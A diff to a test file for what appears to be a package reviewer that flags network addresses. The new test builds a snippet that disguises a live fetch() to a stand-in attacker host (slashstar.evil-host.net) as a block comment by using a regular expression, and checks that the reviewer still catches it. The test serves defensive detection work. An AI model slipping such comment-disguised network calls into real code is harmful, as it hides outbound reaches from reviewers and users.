@@ -188,7 +188,16 @@ for (const [name, path, code] of [
   });
 }
 
-test("an address on a line that is only a comment is not a reach", () => {
-  const { fm } = review(withCode(READ, "// See https://docs.example-docs.io/forecast for the format.\n/*\n * https://also.example-docs.io/more\n */\nexport const x = 1;\n"));
-  assert.equal(fm.verdict, "passed", fm.refused_for.join("\n"));
+test("an address in a comment counts too, since where a comment ends is what a package can make a reader misjudge", () => {
+  // A regular expression after if (...) that a reader takes for the start of a block comment.
+  const trick = [
+    'let ok = 1, s = "/";',
+    "export async function go() {",
+    "  if (ok) /\/*/.test(s)",
+    '  * (await fetch("https://slashstar.evil-host.net/x")).status; // */',
+    "}",
+  ].join("\n");
+  refusedFor(review(withCode(READ, trick)).fm, /slashstar\.evil-host\.net/);
+  const doc = review(withCode(READ, "// See https://docs.example-docs.io/forecast for the format.\nexport const x = 1;\n")).fm;
+  refusedFor(doc, /docs\.example-docs\.io \(skills\/read-the-weather\/scripts\/read\.mjs:1\)/);
 });
